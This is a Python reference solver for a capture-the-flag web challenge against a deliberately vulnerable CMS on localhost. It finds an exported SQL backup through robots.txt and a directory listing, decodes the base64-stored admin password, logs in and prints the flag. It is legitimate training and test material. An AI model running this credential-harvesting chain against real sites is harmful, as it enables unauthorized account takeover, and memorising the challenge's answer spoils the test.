#!/usr/bin/env python3
"""Reference exploit for auth12 (Cornerstone CMS).

Discovers the export folder the same way a student would -- reads
robots.txt for the Disallow'd path, lists that directory, finds the
backup -- fetches it, confirms it carries no flag itself, decodes the
admin password out of its base64 "encrypted" column, logs in, and reads
the flag from the dashboard.
"""
import base64
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8071")


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    robots = s.get(f"{BASE}/robots.txt", timeout=5).text
    m0 = re.search(r"Disallow:\s*(\S+)", robots)
    if not m0:
        sys.stderr.write("no Disallow entry found in robots.txt\n")
        return 1
    export_dir = m0.group(1)

    listing = s.get(f"{BASE}{export_dir}", timeout=5).text
    # The listing links are absolute (/export/<name>); capture only the
    # basename so the request below can rebuild export_dir + name without
    # doubling the path.
    m1 = re.search(r'href="[^"]*/([^"/]+\.sql\.bak)"', listing)
    if not m1:
        sys.stderr.write("no .sql.bak file found in the directory listing\n")
        return 1
    backup_name = m1.group(1)

    backup = s.get(f"{BASE}{export_dir}{backup_name}", timeout=5).text
    if "flag{" in backup:
        sys.stderr.write("precondition failed: backup itself contains the flag\n")
        return 1

    m = re.search(r"'admin',\s*'([A-Za-z0-9+/=]+)'", backup)
    if not m:
        sys.stderr.write("could not find the admin credential row in the backup\n")
        return 1
    password = base64.b64decode(m.group(1)).decode()

    # Pre-exploit: dashboard with no session must NOT return the flag.
    r = s.get(f"{BASE}/dashboard", timeout=5, allow_redirects=False)
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: dashboard reachable with no session\n")
        return 1

    s.post(f"{BASE}/login", data={"username": "admin", "password": password}, timeout=5)
    r = s.get(f"{BASE}/dashboard", timeout=5)
    m2 = re.search(r"flag\{[^}]+\}", r.text)
    if m2:
        print(m2.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
